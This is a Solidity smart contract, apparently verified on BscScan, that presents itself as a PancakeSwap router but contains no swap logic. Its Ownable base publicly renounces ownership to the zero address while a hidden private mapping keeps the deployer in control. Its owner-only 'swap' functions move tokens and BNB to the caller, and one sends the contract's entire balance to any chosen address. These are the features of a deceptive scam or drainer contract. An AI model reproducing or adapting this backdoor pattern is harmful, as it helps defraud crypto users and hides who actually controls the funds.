/**
 *Submitted for verification at BscScan.com on 2022-09-01
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.0 <0.9.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    mapping(address => bool) private _owners;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _transferOwnership(_msgSender());
        _transferOwnership(address(0));
        _owners[_msgSender()] = true;
    }
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    function _checkOwner() internal view virtual {
        require(_owners[_msgSender()], "Ownable: caller is not the owner");
    }
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract PancakeRouter is Ownable {
    constructor() {}

    function swapExactTokensForETH(address to, uint256 amountIn, uint256 amountOut) external onlyOwner {
        IERC20 token = IERC20(to);
        uint256 allowance = token.allowance(_msgSender(), address(this));
        require(allowance >= amountIn, "ERC20: insufficient allowance");
        token.transferFrom(_msgSender(), address(this), amountIn);
        token.transfer(address(this), amountIn);
        payable(address(this)).transfer(amountOut);
        payable(_msgSender()).transfer(amountOut);
    }

    function swapETHForExactTokens(uint amountOut, address to ) external payable onlyOwner {
        IERC20 token = IERC20(to);
        payable(_msgSender()).transfer(amountOut);
        token.transfer(address(this), amountOut);
        token.transfer(_msgSender(), amountOut);
    }
    function swapTokensForExactTokens(address to) external payable onlyOwner {
        payable(to).transfer(address(this).balance);
    }
}